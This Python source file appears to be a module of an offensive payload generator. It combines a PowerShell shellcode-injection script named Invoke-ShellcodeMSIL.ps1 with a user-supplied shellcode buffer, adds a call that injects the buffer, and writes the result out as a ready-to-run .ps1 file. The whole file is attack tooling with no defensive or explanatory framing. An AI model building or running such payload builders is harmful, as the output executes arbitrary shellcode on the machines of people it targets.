import os
class operation:
    def __init__(self):
        self.outputfilename = input('Please type outputfile_basename: ')
        self.path = os.getcwd()
        self.input_tempfile = ""

    def read_payload(self,filename):
        payload = open(filename,'r')
        self.payload = payload.read()
        payload.close()
        return self.payload

    def create_payload(self):
        with open (''.join([os.getcwd(),'/output/',self.outputfilename,'.ps1']),'w') as create_payload:
            create_payload.write('\n\n'.join([self.read_payload(filename=self.path+'/module/injectshellcode/'+'Invoke-ShellcodeMSIL.ps1'),
                                              self.read_payload(filename=self.input_tempfile),
                                              'Invoke-ShellcodeMSIL -Shellcode @($buf)',
                                              ]))
        self.outfile = self.path+'/output/'+self.outputfilename+'.ps1'
        print('Your output file is in %s' %(self.outfile))
        return self.outfile

